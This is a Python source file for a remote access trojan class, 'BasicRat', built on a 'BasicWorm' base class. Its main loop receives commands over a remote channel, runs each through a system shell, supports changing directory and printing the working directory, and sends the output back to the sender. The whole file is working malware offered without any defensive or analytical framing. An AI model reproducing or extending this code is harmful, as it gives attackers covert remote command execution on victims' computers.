

import subprocess

class BasicRat(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "Basic_Rat"
    
    def getPwd(self) -> str:
        return str(os.getcwd())
    
    def changeDir(self, target: str) -> None:
        try:
            os.chdir(target)
            self.sendMsg(f"Change Dir successfull.\n{self.getPwd()}")
        except OSError as e:
            self.sendMsg(f"ERROR: {e}")
    
    def shell(self, command: str) -> None:
        try:
            out = subprocess.run(command, shell=True, capture_output=True, text=True)
            if out.returncode == 0:
                self.sendMsg(f"{out.stdout}\n\n{self.getPwd()}")
            else:
                self.sendMsg(f"ERROR: {out.stderr}\n\n{self.getPwd()}")
        except Exception as e:
            self.sendMsg(f"ERROR: {e}\n\n{self.getPwd()}")
    
    def execCmd(self, cmd: str) -> None:
        if cmd.startswith("cd "):
            self.changeDir(cmd[3:])
            return
        match cmd:
            case "pwd":
                self.sendMsg(self.getPwd())
            case _:
                self.shell(cmd)
    
    def Work(self) -> bool:
        while True:
            cmd = self.reciveMsg()
            if not cmd:
                break
            self.execCmd(cmd)
        return True


